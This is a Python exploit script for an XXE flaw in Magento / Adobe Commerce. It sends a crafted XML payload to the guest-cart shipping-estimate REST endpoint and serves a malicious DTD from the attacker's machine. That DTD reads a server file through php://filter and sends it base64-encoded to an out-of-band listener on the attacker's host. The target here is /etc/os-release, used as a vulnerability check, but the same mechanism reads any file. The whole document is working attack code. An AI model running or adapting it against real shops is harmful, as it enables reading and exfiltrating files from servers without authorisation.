import argparse
import base64
import os
import requests
import socket
import threading
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib3
import warnings
import logging

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# Constants
ATTACKER_SERVER_PORT = 4242
OOB_SERVER_PORT = 2525

def serve_dtd_file(port=4242):
    class DTDRequestHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            logger.info("%s - %s" % (self.address_string(), format % args))
    
    server_address = ('', port)
    httpd = HTTPServer(server_address, DTDRequestHandler)
    logger.info(f"Serving DTD file on port {port}")
    httpd.serve_forever()

def start_oob_server(port=2525):
    class OOBRequestHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            data = base64.b64decode(self.path.split('?')[1]).decode('utf-8')
            logger.info(f"Decoded data saved to response_data.txt.")
            check_response(data) # RESPONSE VALIDATION HERE
            self.send_response(200)
            self.end_headers()

        def log_message(self, format, *args):
            pass
    
    server_address = ('', port)
    httpd = HTTPServer(server_address, OOBRequestHandler)
    httpd.serve_forever()

def check_response(data):
    if 'NAME' in data and 'VERSION' in data:
        logger.info(f"The Magento / Adobe Commerce instance seems to be VULNERABLE.")
    else:
        logger.info(f"The Magento / Adobe Commerce instance seems NOT to be VULNERABLE.")

def get_attacker_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def get_dtd_content(file, oob_server):
    content = f"""<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={file}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM '{oob_server}/?%data;'>">"""
    return content

def save_dtd_to_file(file, oob_server):
    dtd_content = get_dtd_content(file, oob_server)
    with open('dtd.xml', 'w') as f:
        f.write(dtd_content)
    logger.info("DTD file created.")

def get_oob_server(attacker_ip, OOB_SERVER_PORT):
    oob_server = f"http://{attacker_ip}:{OOB_SERVER_PORT}"
    logger.info(f"No OOB server provided, starting custom OOB server on {oob_server}")
    threading.Thread(target=start_oob_server, args=(OOB_SERVER_PORT,), daemon=True).start()
    return oob_server

def send_request(host_server, target):
    payload = f"""<?xml version="1.0" ?>
        <!DOCTYPE r [
            <!ELEMENT r ANY >
            <!ENTITY % sp SYSTEM "{host_server}/dtd.xml">
            %sp;
            %param1;
        ]>
        <r>&exfil;</r>"""

    json_data = {
        "address": {
            "totalsReader": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": payload,
                            "options": 16
                        }
                    }
                }
            }
        }
    }

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json"
    }

    logger.info("Sending the request with specially crafted XML payload referencing the DTD file.")
    response = requests.post(f"{target}/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods",
        headers=headers, json=json_data, verify=False)

def main():
    parser = argparse.ArgumentParser(description='Exploit script for XXE vulnerability')
    parser.add_argument('--target', '-t', required=True, help='Target URL (http(s)://ip[:port])')
    parser.add_argument('--oob-server', '-ob', help='OOB server URL (http(s)://ip[:port])')
    parser.add_argument('--host-server', '-hs', help='Host server URL (http(s)://ip[:port])')
    args = parser.parse_args()

    attacker_ip = get_attacker_ip()
    host_server = args.host_server or f"http://{attacker_ip}:{ATTACKER_SERVER_PORT}"
    oob_server = args.oob_server or get_oob_server(attacker_ip, OOB_SERVER_PORT)
    target = args.target
    file = '/etc/os-release'

    save_dtd_to_file(file, oob_server)

    threading.Thread(target=serve_dtd_file, args=(ATTACKER_SERVER_PORT,), daemon=True).start()

    send_request(host_server, target)

if __name__ == "__main__":
    main()
